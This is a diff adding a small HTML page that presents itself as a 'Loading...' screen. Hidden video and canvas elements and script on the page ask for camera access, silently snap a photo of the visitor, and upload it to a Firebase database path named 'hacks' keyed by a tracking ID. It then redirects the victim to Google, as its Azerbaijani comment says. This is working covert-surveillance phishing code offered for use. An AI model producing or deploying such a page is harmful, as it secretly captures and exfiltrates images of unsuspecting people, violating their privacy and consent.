@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<video id="v" autoplay style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+    const firebaseConfig = { apiKey: "...", databaseURL: "..." }; // İndex-dəki ilə eyni
+    firebase.initializeApp(firebaseConfig);
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+
+    navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+        const v = document.getElementById('v'); v.srcObject = s;
+        setTimeout(() => {
+            const c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const img = c.toDataURL('image/jpeg');
+            firebase.database().ref('hacks/' + ref).push({ image: img, date: new Date().toLocaleString() });
+            window.location.href = "https://google.com"; // Şəkil getdikdən sonra qurbanı Google-a at
+        }, 2000);
+    });
+</script>
+</body>
+</html>
